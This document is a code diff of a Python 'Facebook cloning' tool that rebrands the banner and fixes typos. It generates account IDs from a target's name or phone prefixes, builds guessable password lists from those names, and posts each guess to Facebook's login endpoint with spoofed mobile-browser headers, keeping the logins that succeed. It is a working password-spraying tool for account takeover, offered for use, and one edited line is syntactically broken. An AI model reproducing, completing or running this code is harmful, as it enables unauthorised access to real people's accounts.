@@ -79,19 +79,18 @@ for xd in range(10000):
 
 os.system("xdg-open https://github.com/U7P4L-IN ")
 logo = ("""
- █████  ███    ██  ██████  ███    ██ ██    ██ ███    ███  ██████  ██    ██ ███████ 
-██   ██ ████   ██ ██    ██ ████   ██  ██  ██  ████  ████ ██    ██ ██    ██ ██      
-███████ ██ ██  ██ ██    ██ ██ ██  ██   ████   ██ ████ ██ ██    ██ ██    ██ ███████ 
-██   ██ ██  ██ ██ ██    ██ ██  ██ ██    ██    ██  ██  ██ ██    ██ ██    ██      ██ 
-██   ██ ██   ████  ██████  ██   ████    ██    ██      ██  ██████   ██████  ███████ 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
- ██████ ██    ██ ██████  ███████ ██████                                            
-██       ██  ██  ██   ██ ██      ██   ██                                           
-██        ████   ██████  █████   ██████                                            
-██         ██    ██   ██ ██      ██   ██                                           
- ██████    ██    ██████  ███████ ██   ██                                           
-                                                                                                                                   
-""")
+____ ___    _   _    _   _
+/ ___|_ _|  | | / \  | \ | |
+\___ \| |_  | |/ _ \ |  \| |
+ ___) | | |_| / ___ \| |\  |
+|____/___\___/_/   \_\_| \_|
+══════════════════════════════════════════════════════           
+ [🙂] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊: SIJAN
+ [🙂] 𝐆𝐫𝐨𝐮𝐩: SIJAN TERMUX WORLD
+ [🙂] 𝐆𝐈𝐓𝐇𝐔𝐁   : SIJAN-OP
+ [🙂] VERSION: VIP PASS
+ [🙂]𝐓𝐎𝐎𝐋𝐒           :  BD-PK- India random 
+══════════════════════════════════════════════════════""")
 
 class Main:
     def __init__(self):
@@ -122,10 +121,10 @@ def v1():
     user=[]
     os.system('clear')
     print(logo)
-    kode = input(' [🔥]  TERGET FIRST NAME : ')
-    kodex = input(' [🔥] TERGET LAST NAME :  ')
-    print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')
-    doamin = input(' [📧]  Input Doamin  : ')
+    kode = input(' [🔥]  TARGET FIRST NAME : ')
+    kodex = input(' [🔥] TARGET LAST NAME :  ')
+    print(' [🤝] example Domain : @gmail.com, @yahoo.com ')
+    Domain = input(' [📧]  Input Domain  : ')
     limit = int(input('[?] ENTET YOUR CRACK LIMIT : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
@@ -135,12 +134,12 @@ def v1():
         print(logo)
         tl = str(len(user))
         print(' [🔥]  Total ids:\033[1;92m '+tl)
-        print(f"\033[1;97m [🔥]  Target Doamin:\033[1;92m {doamin}")
+        print(f"\033[1;97m [🔥]  Target Domain:\033[1;92m {Domain}")
         print(' \033[1;97m[🔥]  The process has been started')
         print(' [🔥]  Wait for ids ')
         print(50*'_')
         for guru in user:
-            uid = kode+kodex+guru+doamin
+            uid = kode+kodex+guru+Domain
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
@@ -151,9 +150,9 @@ def v2():
     user=[]
     os.system('clear')
     print(logo)
-    kode = input(' [🔥]  TERGET FIRST NAME : ')
-    kodex = input(' [🔥] TERGET FIRST NAME :  ')
-    doamin = '.'
+    kode = input(' [🔥]  TARGET  FIRST NAME : ')
+    kodex = input(' [🔥] TARGET  FIRST NAME :  ')
+    Domain = '.'
     limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
@@ -163,12 +162,12 @@ def v2():
         print(logo)
         tl = str(len(user))
         print(' [🔥]  Total ids:\033[1;92m '+tl)
-        print(f"\033[1;97m[♥]  Target Doamin:\033[1;92m Facebook CLONING (name)")
+        print(f"\033[1;97m[♥]  Target Domain:\033[1;92m Facebook CLONING (name)")
         print(' \033[1;97m[♥]  The process has been started')
         print(' [♥]  Wait for ids ')
         print(50*'_')
         for guru in user:
-            uid = kode+doamin+kodex+guru
+            uid = kode+Domain+kodex+guru
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kode+'@123',kode+'@1234',kode+'@12345',kode+guru,kodex+'@123',kodex+'@1234',kodex+'@12345']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
@@ -189,7 +188,7 @@ def v3():
     kode = input(' [📞] ENTER SIM CODE: ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
-    doamin = ' FACEBOOK VIP CLONING (BD NUMBER) '
+    Domain = ' FACEBOOK VIP CLONING (BD NUMBER) '
     limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
@@ -199,7 +198,7 @@ def v3():
         print(logo)
         tl = str(len(user))
         print(' \033[1;33m[♥]  TOTAL IDS :\033[1;92m '+tl)
-        print(f"\033[1;33m[♥]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
+        print(f"\033[1;33m[♥]  YOUR TARGET  CRACK MENU:\033[1;92m {Domain}")
         print(' \033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
         print(' \033[1;33m[♥]  WAIT FOR IDS ')
         print(50*'_')
@@ -233,22 +232,24 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
             'method': 'POST',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
-            # 'cookie': 'datr=zXxGZD6k2XpA5hC8OgvYP0m6; sb=zXxGZI6IhibLUaojbdSAEKk4; locale=en_US; dpr=2; m_pixel_ratio=2; wd=980x1821; fr=0LcgLlAiRhoUgSoP5.AWUK5JkvrYHmdTbTjdePAnKL8Tw.BkRnzN.bx.AAA.0.0.BkSALl.AWXiynXNgp0',
+            'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"13.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'cross-site',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro,}
+           'upgrade-insecure-requests': '1',
+           'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',': pro,}
             lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -269,7 +270,7 @@ def rcrack1(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[ANONYMOUS-CYBER💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[Sijan Tools🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
